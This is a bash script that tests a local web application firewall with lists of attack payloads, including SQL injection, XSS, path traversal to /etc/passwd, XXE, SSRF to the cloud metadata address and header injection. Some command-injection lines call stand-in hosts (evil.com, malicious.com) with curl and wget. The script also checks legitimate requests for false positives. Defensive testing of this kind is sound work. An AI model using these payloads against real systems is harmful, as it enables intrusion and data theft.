#!/bin/bash

# WAF Testing Script
# Tests various attack payloads against the Web Application Firewall

set -euo pipefail

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
BASE_URL="http://localhost:3000"
API_KEY="nexus_test_api_key_1234567890abcdef"

# Logging function
log() {
    echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1" >&2
}

success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

# Test SQL Injection payloads
test_sql_injection() {
    log "Testing SQL Injection payloads..."

    local payloads=(
        "1' OR '1'='1"
        "1; DROP TABLE users--"
        "1' UNION SELECT * FROM passwords--"
        "admin'--"
        "1' OR 1=1#"
        "'; EXEC xp_cmdshell('dir')--"
        "1' OR (SELECT COUNT(*) FROM users) > 0--"
    )

    for payload in "${payloads[@]}"; do
        log "Testing payload: $payload"

        # Test in URL parameter
        response=$(curl -s -w "%{http_code}" -o /dev/null \
            -H "X-API-Key: $API_KEY" \
            -G \
            --data-urlencode "id=$payload" \
            "$BASE_URL/api/v1/test" || echo "000")

        if [[ "$response" == "403" ]]; then
            success "SQL Injection blocked (HTTP $response)"
        elif [[ "$response" == "200" ]]; then
            warning "SQL Injection may have passed (HTTP $response)"
        else
            error "Unexpected response: $response"
        fi

        # Test in POST body
        response=$(curl -s -w "%{http_code}" -o /dev/null \
            -H "X-API-Key: $API_KEY" \
            -H "Content-Type: application/json" \
            -X POST \
            -d "{\"query\":\"$payload\"}" \
            "$BASE_URL/api/v1/test" || echo "000")

        if [[ "$response" == "403" ]]; then
            success "SQL Injection blocked in POST (HTTP $response)"
        elif [[ "$response" == "200" ]]; then
            warning "SQL Injection may have passed in POST (HTTP $response)"
        else
            error "Unexpected response in POST: $response"
        fi
    done
}

# Test XSS payloads
test_xss() {
    log "Testing XSS payloads..."

    local payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "javascript:alert('XSS')"
        "<svg onload=alert('XSS')>"
        "<iframe src=javascript:alert('XSS')>"
        "';alert('XSS');//"
        "<body onload=alert('XSS')>"
    )

    for payload in "${payloads[@]}"; do
        log "Testing XSS payload: $payload"

        # Test in URL parameter
        response=$(curl -s -w "%{http_code}" -o /dev/null \
            -H "X-API-Key: $API_KEY" \
            -G \
            --data-urlencode "search=$payload" \
            "$BASE_URL/api/v1/test" || echo "000")

        if [[ "$response" == "403" ]]; then
            success "XSS blocked (HTTP $response)"
        elif [[ "$response" == "200" ]]; then
            warning "XSS may have passed (HTTP $response)"
        else
            error "Unexpected response: $response"
        fi
    done
}

# Test Path Traversal payloads
test_path_traversal() {
    log "Testing Path Traversal payloads..."

    local payloads=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "....//....//....//etc/passwd"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "..%252f..%252f..%252fetc%252fpasswd"
    )

    for payload in "${payloads[@]}"; do
        log "Testing Path Traversal payload: $payload"

        response=$(curl -s -w "%{http_code}" -o /dev/null \
            -H "X-API-Key: $API_KEY" \
            -G \
            --data-urlencode "file=$payload" \
            "$BASE_URL/api/v1/test" || echo "000")

        if [[ "$response" == "403" ]]; then
            success "Path Traversal blocked (HTTP $response)"
        elif [[ "$response" == "200" ]]; then
            warning "Path Traversal may have passed (HTTP $response)"
        else
            error "Unexpected response: $response"
        fi
    done
}

# Test Command Injection payloads
test_command_injection() {
    log "Testing Command Injection payloads..."

    local payloads=(
        "; ls -la"
        "| cat /etc/passwd"
        "& whoami"
        "`id`"
        "$(whoami)"
        "&& curl http://evil.com"
        "|| wget http://malicious.com"
    )

    for payload in "${payloads[@]}"; do
        log "Testing Command Injection payload: $payload"

        response=$(curl -s -w "%{http_code}" -o /dev/null \
            -H "X-API-Key: $API_KEY" \
            -G \
            --data-urlencode "cmd=$payload" \
            "$BASE_URL/api/v1/test" || echo "000")

        if [[ "$response" == "403" ]]; then
            success "Command Injection blocked (HTTP $response)"
        elif [[ "$response" == "200" ]]; then
            warning "Command Injection may have passed (HTTP $response)"
        else
            error "Unexpected response: $response"
        fi
    done
}

# Test SSRF payloads
test_ssrf() {
    log "Testing SSRF payloads..."

    local payloads=(
        "http://localhost:8080"
        "http://127.0.0.1:22"
        "http://169.254.169.254/latest/meta-data/"
        "http://192.168.1.1"
        "https://127.0.0.1/admin"
        "ftp://localhost:21"
    )

    for payload in "${payloads[@]}"; do
        log "Testing SSRF payload: $payload"

        response=$(curl -s -w "%{http_code}" -o /dev/null \
            -H "X-API-Key: $API_KEY" \
            -G \
            --data-urlencode "url=$payload" \
            "$BASE_URL/api/v1/test" || echo "000")

        if [[ "$response" == "403" ]]; then
            success "SSRF blocked (HTTP $response)"
        elif [[ "$response" == "200" ]]; then
            warning "SSRF may have passed (HTTP $response)"
        else
            error "Unexpected response: $response"
        fi
    done
}

# Test NoSQL Injection payloads
test_nosql_injection() {
    log "Testing NoSQL Injection payloads..."

    local payloads=(
        '{"$ne": null}'
        '{"$gt": ""}'
        '{"$regex": ".*"}'
        '{"$where": "this.password == this.username"}'
        '{"$or": [{"username": "admin"}, {"password": "admin"}]}'
    )

    for payload in "${payloads[@]}"; do
        log "Testing NoSQL Injection payload: $payload"

        response=$(curl -s -w "%{http_code}" -o /dev/null \
            -H "X-API-Key: $API_KEY" \
            -H "Content-Type: application/json" \
            -X POST \
            -d "$payload" \
            "$BASE_URL/api/v1/test" || echo "000")

        if [[ "$response" == "403" ]]; then
            success "NoSQL Injection blocked (HTTP $response)"
        elif [[ "$response" == "200" ]]; then
            warning "NoSQL Injection may have passed (HTTP $response)"
        else
            error "Unexpected response: $response"
        fi
    done
}

# Test XXE payloads
test_xxe() {
    log "Testing XXE payloads..."

    local payloads=(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080">]><foo>&xxe;</foo>'
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>'
    )

    for payload in "${payloads[@]}"; do
        log "Testing XXE payload: ${payload:0:50}..."

        response=$(curl -s -w "%{http_code}" -o /dev/null \
            -H "X-API-Key: $API_KEY" \
            -H "Content-Type: application/xml" \
            -X POST \
            -d "$payload" \
            "$BASE_URL/api/v1/test" || echo "000")

        if [[ "$response" == "403" ]]; then
            success "XXE blocked (HTTP $response)"
        elif [[ "$response" == "200" ]]; then
            warning "XXE may have passed (HTTP $response)"
        else
            error "Unexpected response: $response"
        fi
    done
}

# Test buffer overflow
test_buffer_overflow() {
    log "Testing Buffer Overflow..."

    # Create a large payload
    local large_payload=$(printf 'A%.0s' {1..1500})

    log "Testing large payload (${#large_payload} characters)"

    response=$(curl -s -w "%{http_code}" -o /dev/null \
        -H "X-API-Key: $API_KEY" \
        -G \
        --data-urlencode "data=$large_payload" \
        "$BASE_URL/api/v1/test" || echo "000")

    if [[ "$response" == "403" ]]; then
        success "Buffer overflow blocked (HTTP $response)"
    elif [[ "$response" == "200" ]]; then
        warning "Buffer overflow may have passed (HTTP $response)"
    else
        error "Unexpected response: $response"
    fi
}

# Test HTTP Header Injection
test_header_injection() {
    log "Testing HTTP Header Injection..."

    local payloads=(
        "test%0d%0aSet-Cookie:%20malicious=value"
        "test\r\nLocation: http://evil.com"
        "test%0d%0aContent-Length:%200"
    )

    for payload in "${payloads[@]}"; do
        log "Testing Header Injection payload: $payload"

        response=$(curl -s -w "%{http_code}" -o /dev/null \
            -H "X-API-Key: $API_KEY" \
            -H "X-Test: $payload" \
            "$BASE_URL/api/v1/test" || echo "000")

        if [[ "$response" == "403" ]]; then
            success "Header Injection blocked (HTTP $response)"
        elif [[ "$response" == "200" ]]; then
            warning "Header Injection may have passed (HTTP $response)"
        else
            error "Unexpected response: $response"
        fi
    done
}

# Test legitimate requests (should pass)
test_legitimate_requests() {
    log "Testing legitimate requests..."

    local legitimate_requests=(
        "normal search query"
        "user@example.com"
        "John Doe"
        "product-123"
        "category_electronics"
        "2023-12-25"
    )

    for request in "${legitimate_requests[@]}"; do
        log "Testing legitimate request: $request"

        response=$(curl -s -w "%{http_code}" -o /dev/null \
            -H "X-API-Key: $API_KEY" \
            -G \
            --data-urlencode "query=$request" \
            "$BASE_URL/api/v1/test" || echo "000")

        if [[ "$response" == "200" ]]; then
            success "Legitimate request passed (HTTP $response)"
        elif [[ "$response" == "403" ]]; then
            warning "Legitimate request blocked (HTTP $response) - False positive?"
        else
            error "Unexpected response: $response"
        fi
    done
}

# Get WAF statistics
get_waf_stats() {
    log "Getting WAF statistics..."

    response=$(curl -s \
        -H "X-API-Key: $API_KEY" \
        "$BASE_URL/waf/stats" || echo '{"error":"Failed to get stats"}')

    echo "WAF Statistics:"
    echo "$response" | jq '.' 2>/dev/null || echo "$response"
}

# Test WAF health
test_waf_health() {
    log "Testing WAF health..."

    response=$(curl -s \
        -H "X-API-Key: $API_KEY" \
        "$BASE_URL/waf/health" || echo '{"error":"Failed to get health"}')

    echo "WAF Health:"
    echo "$response" | jq '.' 2>/dev/null || echo "$response"
}

# Generate test report
generate_report() {
    local report_file="waf-test-report-$(date +%Y%m%d-%H%M%S).md"

    cat > "$report_file" << EOF
# WAF Test Report

**Generated on:** $(date)
**Target:** $BASE_URL

## Test Summary

This report contains the results of comprehensive WAF testing including:
- SQL Injection tests
- XSS tests
- Path Traversal tests
- Command Injection tests
- SSRF tests
- NoSQL Injection tests
- XXE tests
- Buffer Overflow tests
- HTTP Header Injection tests
- Legitimate request tests

## Test Results

### Attack Detection Tests
All attack payloads should be blocked (HTTP 403).

### False Positive Tests
Legitimate requests should pass (HTTP 200).

## Recommendations

1. Review any false positives
2. Update WAF rules if needed
3. Monitor WAF statistics regularly
4. Keep WAF rules updated

## WAF Statistics

\`\`\`json
$(curl -s -H "X-API-Key: $API_KEY" "$BASE_URL/waf/stats" 2>/dev/null || echo '{"error":"Failed to get stats"}')
\`\`\`

---

**Note:** This is an automated test report. Manual review recommended.
EOF

    success "Test report generated: $report_file"
}

# Main function
main() {
    log "Starting WAF testing..."

    # Check if server is running
    if ! curl -s "$BASE_URL/health" > /dev/null 2>&1; then
        error "Server is not running at $BASE_URL"
        error "Please start the server before running WAF tests"
        exit 1
    fi

    # Run tests
    test_sql_injection
    test_xss
    test_path_traversal
    test_command_injection
    test_ssrf
    test_nosql_injection
    test_xxe
    test_buffer_overflow
    test_header_injection
    test_legitimate_requests

    # Get statistics
    get_waf_stats
    test_waf_health

    # Generate report
    generate_report

    success "WAF testing completed!"
    echo
    echo "Check the generated report for detailed results."
    echo "Monitor the WAF dashboard for real-time statistics."
}

# Run main function
main "$@"
